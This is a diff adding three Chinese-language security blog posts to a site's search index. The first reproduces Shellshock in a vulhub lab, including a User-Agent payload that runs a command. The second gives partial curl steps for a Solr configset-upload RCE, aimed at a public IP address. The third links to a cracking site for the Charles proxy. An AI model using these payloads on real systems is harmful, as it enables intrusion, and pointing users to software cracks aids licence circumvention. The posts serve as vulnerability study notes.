@@ -1545,4 +1545,93 @@
         <tag>VPS</tag>
       </tags>
   </entry>
+  <entry>
+    <title>破壳漏洞复现分析</title>
+    <url>/2020/09/05/%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>破壳”是Bash(GNU Bourne Again Shell)中出现的允许攻击者通过环境变量执行任意命令的漏洞。</p>
+<a id="more"></a>
+
+<hr>
+<h2 id="漏洞名称"><a href="#漏洞名称" class="headerlink" title="漏洞名称"></a>漏洞名称</h2><p>破壳漏洞（Bash Shellshock），CVE编号：2014-6271。</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>GNU Bash 版本小于4.3<br>受影响的版本</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Bash</span>版本小于等于<span class="hljs-number">4</span>.<span class="hljs-number">3</span>版本<br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">4</span> (ELS)<br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">4</span> Extended Lifecycle Support - bash-<span class="hljs-number">3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">27</span>.el<span class="hljs-number">4</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">5</span> - bash-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>-<span class="hljs-number">33</span>.el<span class="hljs-number">5</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">5</span>.<span class="hljs-number">6</span> Long Life - bash-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>-<span class="hljs-number">24</span>.el<span class="hljs-number">5</span>_<span class="hljs-number">6</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">5</span>.<span class="hljs-number">9</span> Extended Update Support - bash-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>-<span class="hljs-number">32</span>.el<span class="hljs-number">5</span>_<span class="hljs-number">9</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">6</span> - bash-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-<span class="hljs-number">15</span>.el<span class="hljs-number">6</span>_<span class="hljs-number">5</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">6</span>.<span class="hljs-number">2</span> Advanced Update Support - bash-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-<span class="hljs-number">9</span>.el<span class="hljs-number">6</span>_<span class="hljs-number">2</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">6</span>.<span class="hljs-number">4</span> Extended Update Support - bash-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-<span class="hljs-number">15</span>.el<span class="hljs-number">6</span>_<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Red</span> Hat Enterprise Linux <span class="hljs-number">7</span> - bash-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">45</span>-<span class="hljs-number">5</span>.el<span class="hljs-number">7</span>_<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">CentOS</span> <span class="hljs-number">5</span> bash-<span class="hljs-number">3</span>.<span class="hljs-number">2</span>-<span class="hljs-number">33</span>.el<span class="hljs-number">5</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">CentOS</span> <span class="hljs-number">6</span> bash-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-<span class="hljs-number">15</span>.el<span class="hljs-number">6</span>_<span class="hljs-number">5</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">CentOS</span> <span class="hljs-number">7</span> bash-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">45</span>-<span class="hljs-number">5</span>.el<span class="hljs-number">7</span>_<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Ubuntu</span>:<br><span class="hljs-attribute">10</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">bash</span> <span class="hljs-number">4</span>.<span class="hljs-number">1</span>-<span class="hljs-number">2</span>ubuntu<span class="hljs-number">3</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">12</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">bash</span> <span class="hljs-number">4</span>.<span class="hljs-number">2</span>-<span class="hljs-number">2</span>ubuntu<span class="hljs-number">2</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">14</span>.<span class="hljs-number">04</span><br><span class="hljs-attribute">bash</span> <span class="hljs-number">4</span>.<span class="hljs-number">3</span>-<span class="hljs-number">7</span>ubuntu<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Fedora</span>:<br><span class="hljs-attribute">19</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">47</span>-<span class="hljs-number">2</span>.fc<span class="hljs-number">19</span><br><span class="hljs-attribute">20</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">4</span>.<span class="hljs-number">2</span>.<span class="hljs-number">47</span>-<span class="hljs-number">4</span>.fc<span class="hljs-number">20</span><br><span class="hljs-attribute">21</span><br><span class="hljs-attribute">bash</span>-<span class="hljs-number">4</span>.<span class="hljs-number">3</span>.<span class="hljs-number">22</span>-<span class="hljs-number">3</span>.fc<span class="hljs-number">21</span><br><span class="hljs-attribute">Debian</span>:<br><span class="hljs-attribute">4</span>.<span class="hljs-number">1</span>-<span class="hljs-number">3</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">1</span>-<span class="hljs-number">3</span>+deb<span class="hljs-number">6</span>u<span class="hljs-number">1</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">2</span>+dfsg-<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">2</span>+dfsg-<span class="hljs-number">0</span>.<span class="hljs-number">1</span>+deb<span class="hljs-number">7</span>u<span class="hljs-number">1</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">3</span>-<span class="hljs-number">9</span><br><span class="hljs-attribute">4</span>.<span class="hljs-number">3</span>-<span class="hljs-number">9</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Amazon</span> Linux AMI<br><span class="hljs-attribute">bash</span>-<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-<span class="hljs-number">15</span>.<span class="hljs-number">19</span><br><span class="hljs-attribute">Mac</span> OS X<br><span class="hljs-attribute">10</span>.<span class="hljs-number">10</span><br><br></code></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里使用<a href="https://github.com/vulhub/vulhub/tree/master/bash/shellshock">vulhub</a> shellchock环境</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /vulhub/bash/shellshock<br>docker-compose up -d   <span class="hljs-comment">#启动</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2D2FB65A-D223-4236-BABC-E53B4A401D89.png"></p>
+<p>环境已搭建完成</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>检验漏洞存在</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> -it shellshock_web_1 /bin/bash   <span class="hljs-comment">#进入靶场环境</span><br><br>bash --version   <span class="hljs-comment">#查看bash版本是否小于或等于4.3</span><br><br>env x=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo shellshocked&#x27;</span> bash  -c <span class="hljs-string">&quot;echo test&quot;</span>      <span class="hljs-comment"># 简单的验证</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/31CA39F4-FD32-4B55-8FE8-BE823D1E9F90.png"></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/E03E0AED-FB14-41A5-A469-3984F1B30200.png"></p>
+<p>出现shellshocked 字样 存在漏洞</p>
+<h3 id="具体利用条件"><a href="#具体利用条件" class="headerlink" title="具体利用条件"></a>具体利用条件</h3><p>这里使用vulhub中的环境去利用该漏洞</p>
+<p>vulhub生成两个界面：</p>
+<ul>
+<li>存在漏洞界面 <a href="http://ip:8080/victim.cgi">http://ip:8080/victim.cgi</a>  # bash4.3</li>
+<li>正常界面 <a href="http://ip:8080/safe.cgi">http://ip:8080/safe.cgi</a>  #bash新版</li>
+</ul>
+<p><strong>bash 4.3版本</strong><br>将payload附在User-Agent中访问victim.cgi：</p>
+<figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf">User-<span class="hljs-built_in">Agent</span>: () &#123; foo; &#125;; <span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">Type</span>: <span class="hljs-built_in">text</span>/plain; <span class="hljs-built_in">echo</span>; /usr/bin/id<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/16D83494-91BD-4316-A389-636379BB466E.png"></p>
+<p><strong>新版bash</strong><br>使用相同的payload，命令未执行</p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/8CCE63C6-7A22-4A73-935B-DE6E244CFC66.png"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在最初检测的payload中</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">env x=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo shellshocked&#x27;</span> bash  -c <span class="hljs-string">&quot;echo test&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>这里是定义了一个环境变量x，它的内容是 () { :;}; echo shellshocked。</p>
+<ul>
+<li>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。</li>
+<li>正常bash中，子进程无法获取父进程定义的变量值，但如果使用export去定义变量为环境变量，则可在子进程中使用这些变量。</li>
+<li>bash -c 开启一个子shell 并执行后面comment参数</li>
+</ul>
+<p>也就是说 最初检测的payload中，x在父进程中是一个字符串，并加入环境变量中。随后bash -c开启一个子shell，在子shell中，x是一个函数且为环境变量，可以执行命令。</p>
+<p><strong>我们在漏洞环境中验证猜想</strong></p>
+<p><img src="https://raw.githubusercontent.com/alpha302/cloudimg/master/2A51F05E-D2D2-4561-8A46-498F5B85081D.png"></p>
+<p>漏洞存在的核心问题在于输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。（hello是全局环境变量且解析为函数）</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>升级bash版本至4.3以上。<br>cgi等可能执行shell的中间件都需要对传入的参数进行控制。</p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>solr未授权rce——2020-13957</title>
+    <url>/2020/10/18/solr%E6%9C%AA%E6%8E%88%E6%9D%83rce%E2%80%94%E2%80%942020-13957/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>1.漏洞名称<br>2.漏洞影响范围<br>3.漏洞版本<br>4.环境搭建<br>5.漏洞复现具体步骤<br>6.漏洞基础分析<br>7.漏洞防御</p>
+<p>又要开始hw了，很烦。</p>
+<a id="more"></a>
+
+<hr>
+<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">conf1234.<span class="hljs-keyword">zip</span><br><br>1.<br>    #首先构造含有恶意配置的myconfigset.<span class="hljs-keyword">zip</span><br><br><br>2.  <br>curl -X <span class="hljs-keyword">POST</span> --header <span class="hljs-string">&quot;Content-Type:application/octet-stream&quot;</span> --data-binary @conf1234.<span class="hljs-keyword">zip</span> &quot;http:<span class="hljs-comment">//116.203.198.65:8983/solr/admin/configs?action=UPLOAD&amp;name=conf1234          #上传myconfigset.zip进入ZooKeeper</span><br><br><br>3.curl -v <span class="hljs-string">&quot;http://116.203.198.65:8983/solr/admin/collections?action=CREATE&amp;name=newCollection3&amp;numShards=2&amp;replicationFactor=1&amp;wt=xml&amp;collection.configName=conf1234&quot;</span>           #从Zookeeper中选择恶意的solrconfig.xml创建新的Collection<br><br><br><br>4.<br><br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>破解合集</title>
+    <url>/2020/09/09/%E7%A0%B4%E8%A7%A3%E5%90%88%E9%9B%86/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>mac和windows下软件</p>
+<a id="more"></a>
+
+<hr>
+<h1 id="Charles破解"><a href="#Charles破解" class="headerlink" title="Charles破解"></a>Charles破解</h1><p> <a href="https://www.zzzmode.com/mytools/charles/">charles</a>是mac下一款好用-的抓包工具</p>
+<p> windows常用fiddler抓包哦</p>
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
+      <categories>
+        <category>软件</category>
+      </categories>
+      <tags>
+        <tag>破解</tag>
+      </tags>
+  </entry>
 </search>
